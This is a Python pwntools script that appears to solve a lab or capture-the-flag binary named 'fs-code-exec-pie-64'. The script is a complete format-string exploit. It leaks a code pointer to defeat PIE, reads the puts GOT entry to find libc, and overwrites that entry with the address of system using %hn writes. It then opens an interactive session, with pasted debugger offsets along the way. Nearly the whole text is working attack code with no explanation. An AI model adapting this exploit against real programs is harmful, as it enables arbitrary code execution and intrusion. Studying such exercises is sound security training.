#!/usr/bin/env python

from pwn import *
env = {
        'PATH' : '.:/bin:/usr/bin'
        }

p = process('fs-code-exec-pie-64', env=env)
puts_got = p.elf.got['puts']
print(hex(puts_got))

"""
pwndbg> 0x555555554d11
Undefined command: "0x555555554d11".  Try "help".
pwndbg> 0x555555554000
Undefined command: "0x555555554000".  Try "help".
"""

print(p.recv())
p.sendline("%p")

data = p.recv()
print(repr(data))

hex_addr = data.split(' ')[1].split('\n')[0]

code_addr = int(hex_addr, 16)
code_base = code_addr - 0x555555554d11 + 0x555555554000

print(hex(code_base))

puts_got_real = code_base + puts_got

buf = '%7$sBBBB' + p64(puts_got_real)

p.sendline(buf)

data = p.recv()

print(repr(data))


d = data.split(': ')[1][:6] + "\x00\x00"

libc_puts = u64(d)

print(hex(libc_puts))


"""
$1 = {<text variable, no debug info>} 0x7ffff7a7c690 <_IO_puts>
$2 = {<text variable, no debug info>} 0x7ffff7a52390 <__libc_system>
"""

libc_system = libc_puts - 0x7ffff7a7c690 + 0x7ffff7a52390

first = libc_system & 0xffff
second = ((libc_system >> 16) & 0xffff) - first
while second < 0:
    second += 0x10000

third = ((libc_system >> 32) & 0xffff) - second - first
while third < 0:
    third += 0x10000


buf = '%' + ('%05dx' % first) + '%11$hn' + '%' + ('%05dx' % second) + '%12$hn' + '%' + ('%05dx' % third) + '%13$hn' + 'A' + p64(puts_got_real) + p64(puts_got_real+2) + p64(puts_got_real+4)

p.sendline(buf)

p.interactive()
